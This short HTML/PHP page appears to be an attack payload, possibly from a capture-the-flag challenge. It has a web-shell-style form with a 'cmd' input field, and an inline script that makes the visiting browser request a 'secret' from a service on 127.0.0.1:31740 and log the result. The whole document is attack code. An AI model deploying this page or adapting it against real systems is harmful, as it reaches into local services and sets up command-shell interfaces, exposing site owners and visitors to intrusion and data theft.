<html>
<body style="background:red">

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
</form>
<pre>
<script>
    const xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1:31740/secret");
xhr.send();
xhr.responseType = "json";
xhr.onload = () => {
  if (xhr.readyState == 4 && xhr.status == 200) {
    const data = xhr.response;
    console.log(data);
  } else {
    console.log(`Error: ${xhr.status}`);
  }
};
</script>
</pre>
</body>
</html>